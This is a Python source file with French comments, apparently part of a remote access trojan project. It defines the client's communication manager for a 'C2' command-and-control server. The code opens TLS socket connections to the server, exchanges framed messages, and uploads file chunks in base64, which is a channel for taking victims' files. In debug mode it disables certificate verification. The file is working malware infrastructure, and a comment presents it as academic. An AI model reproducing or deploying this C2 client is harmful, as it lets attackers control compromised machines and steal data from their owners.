"""
Communication Manager - Gestion de la communication client-serveur
Inspiré des techniques de communication des RATs modernes avec chiffrement
"""

import socket
import ssl
import json
import threading
import time
from typing import Dict, Any, Optional, Tuple
import logging

from client.utils.config import ClientConfig
from shared.protocol import Protocol, MessageType
from shared.exceptions import RATException

logger = logging.getLogger(__name__)

class CommunicationManager:
    """Gestionnaire de communication sécurisée avec le serveur C2"""
    
    def __init__(self, config: ClientConfig):
        self.config = config
        self.socket = None
        self.ssl_context = None
        self.connected = False
        self.last_activity = 0
        
        # Buffers de communication
        self.send_buffer = []
        self.receive_buffer = []
        self.buffer_lock = threading.Lock()
        
        # Statistiques
        self.bytes_sent = 0
        self.bytes_received = 0
        self.messages_sent = 0
        self.messages_received = 0
        self.connection_attempts = 0
        self.last_error = None
        
        # Configuration SSL si activé
        if config.USE_SSL:
            self._setup_ssl_context()
    
    def _setup_ssl_context(self):
        """Configure le contexte SSL pour la communication chiffrée"""
        try:
            self.ssl_context = ssl.create_default_context()
            
            # Pour un environnement de test/académique
            if self.config.DEBUG:
                self.ssl_context.check_hostname = False
                self.ssl_context.verify_mode = ssl.CERT_NONE
                logger.debug("SSL configuré en mode test (vérification désactivée)")
            
            # Configuration des ciphers sécurisés
            self.ssl_context.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS')
            
            logger.debug("Contexte SSL configuré")
            
        except Exception as e:
            logger.error(f"Erreur configuration SSL: {e}")
            self.ssl_context = None
    
    def connect(self) -> bool:
        """Établit la connexion avec le serveur C2"""
        try:
            self.connection_attempts += 1
            
            if self.config.DEBUG:
                logger.debug(f"Tentative de connexion #{self.connection_attempts}")
            
            # Création du socket
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(self.config.CONNECTION_TIMEOUT)
            
            # Connexion au serveur
            server_address = (self.config.SERVER_HOST, self.config.SERVER_PORT)
            self.socket.connect(server_address)
            
            # Chiffrement SSL si activé
            if self.config.USE_SSL and self.ssl_context:
                try:
                    self.socket = self.ssl_context.wrap_socket(
                        self.socket, 
                        server_hostname=self.config.SERVER_HOST
                    )
                    logger.debug("Connexion SSL établie")
                except Exception as e:
                    logger.error(f"Erreur SSL: {e}")
                    self.socket.close()
                    return False
            
            # Configuration du socket
            self.socket.settimeout(self.config.SOCKET_TIMEOUT)
            self.connected = True
            self.last_activity = time.time()
            
            if self.config.DEBUG:
                logger.info(f"Connexion établie avec {server_address}")
            
            return True
            
        except socket.timeout:
            self.last_error = "Timeout de connexion"
            if self.config.DEBUG:
                logger.error("Timeout lors de la connexion")
        except socket.gaierror as e:
            self.last_error = f"Erreur de résolution DNS: {e}"
            if self.config.DEBUG:
                logger.error(f"Erreur DNS: {e}")
        except ConnectionRefusedError:
            self.last_error = "Connexion refusée par le serveur"
            if self.config.DEBUG:
                logger.error("Connexion refusée")
        except Exception as e:
            self.last_error = f"Erreur de connexion: {e}"
            if self.config.DEBUG:
                logger.error(f"Erreur connexion: {e}")
        
        # Nettoyage en cas d'échec
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
            self.socket = None
        
        self.connected = False
        return False
    
    def disconnect(self):
        """Ferme la connexion proprement"""
        try:
            if self.connected and self.socket:
                # Envoi d'un message de déconnexion
                disconnect_msg = Protocol.create_message(
                    MessageType.DISCONNECT,
                    {'reason': 'client_disconnect', 'timestamp': time.time()}
                )
                try:
                    self._send_raw_message(disconnect_msg)
                except:
                    pass  # Ignorer les erreurs lors de la déconnexion
            
            if self.socket:
                self.socket.close()
                self.socket = None
            
            self.connected = False
            
            if self.config.DEBUG:
                logger.info("Déconnexion effectuée")
                
        except Exception as e:
            if self.config.DEBUG:
                logger.error(f"Erreur lors de la déconnexion: {e}")
    
    def send_message(self, message: Dict[str, Any]) -> bool:
        """
        Envoie un message au serveur
        
        Args:
            message: Message à envoyer (dictionnaire)
        
        Returns:
            bool: True si succès, False sinon
        """
        if not self.connected or not self.socket:
            return False
        
        try:
            return self._send_raw_message(message)
        except Exception as e:
            if self.config.DEBUG:
                logger.error(f"Erreur envoi message: {e}")
            self.connected = False
            return False
    
    def receive_message(self, timeout: Optional[float] = None) -> Optional[Dict[str, Any]]:
        """
        Reçoit un message du serveur
        
        Args:
            timeout: Timeout en secondes (None = utilise la config)
        
        Returns:
            Dict ou None si pas de message
        """
        if not self.connected or not self.socket:
            return None
        
        try:
            # Configuration du timeout
            original_timeout = self.socket.gettimeout()
            if timeout is not None:
                self.socket.settimeout(timeout)
            
            # Réception des données
            data = self._receive_raw_data()
            
            if data:
                # Décodage du message
                message = Protocol.decode_message(data)
                if message:
                    self.messages_received += 1
                    self.last_activity = time.time()
                    return message
            
            return None
            
        except socket.timeout:
            return None  # Timeout normal, pas d'erreur
        except Exception as e:
            if self.config.DEBUG:
                logger.error(f"Erreur réception message: {e}")
            self.connected = False
            return None
        finally:
            # Restauration du timeout original
            if timeout is not None and self.socket:
                try:
                    self.socket.settimeout(original_timeout)
                except:
                    pass
    
    def _send_raw_message(self, message: Dict[str, Any]) -> bool:
        """Envoie un message brut (avec protocole)"""
        try:
            # Encodage du message
            encoded_data = Protocol.encode_message(message)
            
            # Envoi des données
            total_sent = 0
            while total_sent < len(encoded_data):
                sent = self.socket.send(encoded_data[total_sent:])
                if sent == 0:
                    raise RuntimeError("Connexion fermée par le serveur")
                total_sent += sent
            
            # Mise à jour des statistiques
            self.bytes_sent += len(encoded_data)
            self.messages_sent += 1
            self.last_activity = time.time()
            
            return True
            
        except Exception as e:
            if self.config.DEBUG:
                logger.error(f"Erreur envoi brut: {e}")
            raise
    
    def _receive_raw_data(self) -> Optional[bytes]:
        """Reçoit des données brutes du serveur"""
        try:
            # Lecture de la taille du message (4 bytes en little-endian)
            size_data = self._recv_exact(4)
            if not size_data:
                return None
            
            # Décodage de la taille
            message_size = int.from_bytes(size_data, byteorder='little')
            
            # Validation de la taille (protection contre les attaques)
            if message_size > self.config.MAX_MESSAGE_SIZE:
                raise RATException(f"Message trop volumineux: {message_size} bytes")
            
            # Lecture du message complet
            message_data = self._recv_exact(message_size)
            if not message_data:
                return None
            
            # Mise à jour des statistiques
            self.bytes_received += len(size_data) + len(message_data)
            
            return message_data
            
        except Exception as e:
            if self.config.DEBUG:
                logger.error(f"Erreur réception brute: {e}")
            raise
    
    def _recv_exact(self, size: int) -> Optional[bytes]:
        """Reçoit exactement 'size' bytes du serveur"""
        data = b''
        while len(data) < size:
            chunk = self.socket.recv(size - len(data))
            if not chunk:
                if data:
                    raise RuntimeError("Connexion fermée pendant la réception")
                return None
            data += chunk
        return data
    
    def send_file_chunk(self, chunk_data: bytes, chunk_id: str, total_chunks: int) -> bool:
        """
        Envoie un chunk de fichier au serveur
        
        Args:
            chunk_data: Données du chunk
            chunk_id: Identifiant du chunk
            total_chunks: Nombre total de chunks
        """
        try:
            import base64
            
            chunk_message = Protocol.create_message(
                MessageType.FILE_CHUNK,
                {
                    'chunk_id': chunk_id,
                    'total_chunks': total_chunks,
                    'data': base64.b64encode(chunk_data).decode('utf-8'),
                    'size': len(chunk_data)
                }
            )
            
            return self.send_message(chunk_message)
            
        except Exception as e:
            if self.config.DEBUG:
                logger.error(f"Erreur envoi chunk: {e}")
            return False
    
    def is_connected(self) -> bool:
        """Vérifie si la connexion est active"""
        if not self.connected or not self.socket:
            return False
        
        try:
            # Test rapide de la connexion
            self.socket.settimeout(0.1)
            ready = self.socket.recv(1, socket.MSG_PEEK)
            return True
        except socket.timeout:
            return True  # Pas de données en attente, mais connexion OK
        except:
            self.connected = False
            return False
        finally:
            if self.socket:
                self.socket.settimeout(self.config.SOCKET_TIMEOUT)
    
    def get_connection_stats(self) -> Dict[str, Any]:
        """Retourne les statistiques de connexion"""
        uptime = 0
        if self.connected:
            uptime = time.time() - self.last_activity
        
        return {
            'connected': self.connected,
            'server_host': self.config.SERVER_HOST,
            'server_port': self.config.SERVER_PORT,
            'use_ssl': self.config.USE_SSL,
            'connection_attempts': self.connection_attempts,
            'bytes_sent': self.bytes_sent,
            'bytes_received': self.bytes_received,
            'messages_sent': self.messages_sent,
            'messages_received': self.messages_received,
            'last_activity': self.last_activity,
            'uptime': uptime,
            'last_error': self.last_error
        }
    
    def test_connection(self) -> Dict[str, Any]:
        """Teste la connexion avec le serveur"""
        try:
            start_time = time.time()
            
            # Test de connexion basique
            test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            test_socket.settimeout(5)
            
            result = test_socket.connect_ex((self.config.SERVER_HOST, self.config.SERVER_PORT))
            test_socket.close()
            
            latency = (time.time() - start_time) * 1000  # en ms
            
            if result == 0:
                return {
                    'status': 'success',
                    'reachable': True,
                    'latency_ms': round(latency, 2),
                    'server': f"{self.config.SERVER_HOST}:{self.config.SERVER_PORT}"
                }
            else:
                return {
                    'status': 'error',
                    'reachable': False,
                    'error_code': result,
                    'server': f"{self.config.SERVER_HOST}:{self.config.SERVER_PORT}"
                }
                
        except Exception as e:
            return {
                'status': 'error',
                'reachable': False,
                'error': str(e),
                'server': f"{self.config.SERVER_HOST}:{self.config.SERVER_PORT}"
            }
    
    def set_keepalive(self, enable: bool = True):
        """Configure le keep-alive sur la socket"""
        if self.socket:
            try:
                if enable:
                    self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                    
                    # Configuration spécifique selon l'OS
                    import platform
                    if platform.system().lower() == 'linux':
                        self.socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 60)
                        self.socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 10)
                        self.socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 3)
                else:
                    self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 0)
                    
                if self.config.DEBUG:
                    logger.debug(f"Keep-alive {'activé' if enable else 'désactivé'}")
                    
            except Exception as e:
                if self.config.DEBUG:
                    logger.warning(f"Impossible de configurer keep-alive: {e}")